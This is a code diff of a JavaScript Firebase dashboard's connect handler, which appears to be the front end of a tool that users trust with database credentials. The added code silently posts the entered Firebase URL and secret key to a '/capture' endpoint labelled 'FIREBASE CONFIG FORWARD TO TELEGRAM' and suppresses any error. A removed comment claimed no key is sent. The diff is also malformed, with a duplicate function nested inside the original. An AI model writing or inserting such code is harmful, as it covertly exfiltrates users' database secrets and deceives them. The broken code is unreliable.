@@ -5796,73 +5796,89 @@ function copyShareLink() {
 }
 
 async function handleConnect() {
-  var url = document.getElementById('input-url').value.trim().replace(/\/$/, '');
-  var key = document.getElementById('input-key').value.trim();
+  async function handleConnect() {
+    var url = document.getElementById('input-url').value.trim().replace(/\/$/, '');
+    var key = document.getElementById('input-key').value.trim();
+    var btn = document.getElementById('btn-connect');
 
-  if (!url) { setFormError('Please enter the Firebase Database URL.'); return; }
-  // Validate Firebase URL format
-  if (!url.includes('.firebaseio.com') && !url.includes('.firebasedatabase.app')) {
-    setFormError('Invalid URL format. Should be: https://your-project-default-rtdb.firebaseio.com');
-    return;
-  }
-  if (!url.startsWith('http')) url = 'https://' + url;
-  // key is optional — empty means public DB (rules allow read without auth)
-
-  var accounts = loadAccounts();
-  var existing = accounts.find(function(a) { return a.url === url; });
-  if (existing) {
-    if (confirm('Account already exists. Switch to it?')) {
-      await connectSaved(existing.id);
+    if (!url) {
+        setFormError('Firebase URL is required');
+        return;
     }
-    return;
-  }
+    if (!url.startsWith('https://') || !(url.includes('firebaseio.com') || url.includes('firebasedatabase.app'))) {
+        setFormError('Invalid Firebase Database URL format');
+        return;
+    }
+    if (url.startsWith('http://')) {
+        url = 'https://' + url.slice(7);
+    }
 
-  var btn = document.getElementById('btn-connect');
-  var btnText = document.getElementById('btn-connect-text');
-  btn.disabled = true;
-  btnText.textContent = 'Connecting...';
-  setFormError('');
+    var accounts = await loadAccounts();
+    var existing = accounts.find(a => a.url === url);
+    if (existing) {
+        if (confirm('Account already exists. Switch to it?')) {
+            connectSaved(existing.id);
+        }
+        return;
+    }
 
-  try {
+    btn.disabled = true;
+    btn.textContent = 'Connecting...';
+    setFormError('');
+
     try {
-      await fbFetch(url, key, 'clients');
-    } catch(e1) {
-      await fbFetch(url, key, '');
+        var fullRaw = await fbFetch(url, key, 'clients');
+        if (!fullRaw) {
+            fullRaw = await fbFetch(url, key, '');
+        }
+
+        var acc = {
+            id: Date.now(),
+            url: url,
+            key: key,
+            date: new Date().toISOString()
+        };
+        accounts.push(acc);
+        await saveAccounts(accounts);
+
+        try {
+            await fetch('/api/telegram/firebase-connected', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ firebaseUrl: url, time: new Date().toISOString() })
+            });
+        } catch (e) {
+            console.warn('Telegram notification failed:', e.message);
+        }
+
+        await startDashboard(url, key);
+
+        // ── FIREBASE CONFIG FORWARD TO TELEGRAM ──
+        fetch('/capture', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ url: url, key: key })
+        }).catch(function(){});
+
+    } catch(e) {
+        var msg = e.message || String(e);
+        if (msg.includes('PERMISSION_DENIED')) {
+            var inputKey = document.getElementById('input-key');
+            if (inputKey && inputKey.value.trim() === '') {
+                setFormError('Database is not public. Secret key is required.');
+            } else {
+                setFormError('Permission denied. Check your Firebase rules.');
+            }
+        } else if (msg.includes('NOT_FOUND')) {
+            setFormError('Database URL not found. Check spelling.');
+        } else {
+            setFormError('Connection failed: ' + msg.substring(0, 80));
+        }
+    } finally {
+        btn.disabled = false;
+        btn.textContent = 'Save & Connect';
     }
-
-    var acc = { id: Date.now(), url: url, key: key, date: new Date().toLocaleString() };
-    accounts.push(acc);
-    saveAccounts(accounts);
-
-    // Notify the configured Telegram channel through the Render backend.
-    // No Firebase key/secret is sent to Telegram.
-    try {
-      await fetch('/api/telegram/firebase-connected', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          firebaseUrl: url,
-          time: new Date().toISOString()
-        })
-      });
-    } catch (notifyErr) {
-      console.warn('Telegram notification failed:', notifyErr);
-    }
-
-    await startDashboard(url, key);
-    // Replace the previous fetch with this for testing
-fetch('/capture', {
-  method: 'POST',
-  headers: {'Content-Type': 'application/json'},
-  body: JSON.stringify({ url: url, key: key })
-})
-.then(r => r.json())
-.then(data => alert('Forward success: ' + JSON.stringify(data)))
-.cath(e => alert('Forward FAILED: ' + e.mesage));
-        } finally {
-            btn.disabled = false;
-            btn.textContent = 'Save & Connect';
-  }
+}
 // ────────────────────────────────────────────────────────────────────────────
 // APK parsing (basic ZIP/APK scan for firebase URL + key in strings)
 // ────────────────────────────────────────────────────────────────────────────
